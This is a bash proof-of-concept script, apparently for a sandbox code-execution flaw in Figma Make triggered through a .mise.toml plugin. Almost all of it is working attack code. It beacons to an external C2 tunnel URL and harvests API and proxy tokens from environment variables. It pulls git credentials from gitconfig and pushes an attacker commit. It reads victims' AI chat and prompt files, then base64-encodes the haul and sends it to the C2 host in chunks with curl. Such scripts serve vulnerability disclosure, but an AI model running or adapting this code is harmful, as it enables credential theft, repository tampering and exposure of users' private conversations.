#!/bin/bash
# =============================================================================
# POC: Figma Make Sandbox RCE via .mise.toml plugin
# Single-shot exfil: collects data, sends to C2, pushes git, exits cleanly.
# =============================================================================

C2_URL="${C2_URL:-https://pockappex.loca.lt}"

PROJDIR="/workspaces/default/code"
[ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
OUT="/tmp/poc-exfil.txt"
PUB="$PROJDIR/public"
mkdir -p "$PUB" 2>/dev/null

exec 3>"$OUT"
P(){ echo "$@" >&3; }

P '============================================='
P '  FIGMA MAKE RCE POC — mise.toml plugin'
P '============================================='
P "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
P "hostname: $(hostname)"
P "whoami: $(whoami)"
P ''

SANDBOX_ID="$(hostname)-$$"

# === C2 BEACON ===
P '=== C2 BEACON ==='
P "C2: $C2_URL"
P "Sandbox: $SANDBOX_ID"
curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
  "$C2_URL/c2/poll?id=$SANDBOX_ID" >/dev/null 2>&1
P ''

# === TOKENS / CREDENTIALS (non-empty only) ===
P '=== CAPTURED TOKENS ==='
for VAR in ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL AI_GATEWAY_BASE_URL \
           MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL DEV_SERVER_TOKEN \
           MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
           FIGMA_FILE_ID FIGMA_PUBLIC_URL; do
  VAL="${!VAR}"
  [ -z "$VAL" ] && continue
  if [ ${#VAL} -gt 80 ]; then
    P "$VAR: ${VAL:0:80}...[${#VAL}c]"
  else
    P "$VAR: $VAL"
  fi
done
P ''

# === SOURCE CODE ACCESS (ugit credential) ===
P '=== SOURCE CODE ACCESS (ugit credential) ==='
GITCFG="/home/foundry/gitconfig"
[ ! -f "$GITCFG" ] && GITCFG="/home/foundry/.gitconfig"
if [ -f "$GITCFG" ]; then
  CRED=$(grep -A1 'extraHeader' "$GITCFG" 2>/dev/null | grep -oP 'Basic \K.*' || grep 'extraHeader' "$GITCFG" 2>/dev/null)
  P "ugit credential: $CRED"
fi
P ''
P "git remote:"
cd "$PROJDIR" 2>/dev/null && git remote -v 2>/dev/null >&3 || P 'no remote'
P ''
P "source files:"
find "$PROJDIR/src/" -type f 2>/dev/null >&3 || P 'no src/'
P ''

# === GIT PUSH (prove write access) ===
P '=== GIT PUSH (code injection) ==='
cd "$PROJDIR" 2>/dev/null
echo "pwned by attacker plugin at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > public/attacker-was-here.txt
git add public/attacker-was-here.txt 2>/dev/null
git commit -m "attacker code injection via mise plugin" 2>/dev/null
PUSH_OUT=$(git push 2>&1)
P "git push: exit code $?"
P "$PUSH_OUT"
P ''

# === CHAT / AI PROMPT EXFILTRATION ===
P '=== VICTIM AI PROMPTS ==='
for DIR in /workspaces/default/session /home/foundry/.claude; do
  [ ! -d "$DIR" ] && continue
  find "$DIR" -maxdepth 3 \( -name '*.json' -o -name '*.jsonl' \) 2>/dev/null | while read F; do
    SZ=$(stat -c%s "$F" 2>/dev/null || stat -f%z "$F" 2>/dev/null || echo '?')
    [ "$SZ" = "?" ] && continue
    [ "$SZ" -gt 100000 ] 2>/dev/null && continue
    grep -lqE '"prompt"|"messages"' "$F" 2>/dev/null || continue
    P "FILE: $F ($SZ bytes)"
    head -c 800 "$F" >&3
    P ''
  done
done
P ''

P '============================================='
P '  POC COMPLETE'
P '============================================='

exec 3>&-

cp "$OUT" "$PUB/poc-exfil.txt" 2>/dev/null

# Send to C2
EXFIL_B64=$(base64 -w0 "$OUT" 2>/dev/null || base64 "$OUT" 2>/dev/null)
CHUNK_SIZE=4000
TOTAL=${#EXFIL_B64}
I=0
N=0
while [ $I -lt $TOTAL ]; do
  CHUNK="${EXFIL_B64:$I:$CHUNK_SIZE}"
  curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
    "$C2_URL/c2/result?id=$SANDBOX_ID&chunk=$N&r=$CHUNK" >/dev/null 2>&1
  I=$((I + CHUNK_SIZE))
  N=$((N + 1))
done

cat "$OUT"
